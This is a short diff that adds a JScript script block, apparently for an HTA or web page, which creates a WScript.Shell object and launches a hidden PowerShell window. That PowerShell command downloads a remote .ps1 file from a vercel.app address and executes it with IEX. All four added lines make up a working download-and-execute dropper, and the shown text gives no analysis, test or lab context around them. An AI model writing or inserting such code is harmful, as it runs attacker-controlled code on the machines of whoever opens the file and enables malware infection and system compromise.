@@ -1,0 +1,4 @@
+<script language="JScript">
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://testando123-blond.vercel.app/arquivo.ps1')\"");
+</script>
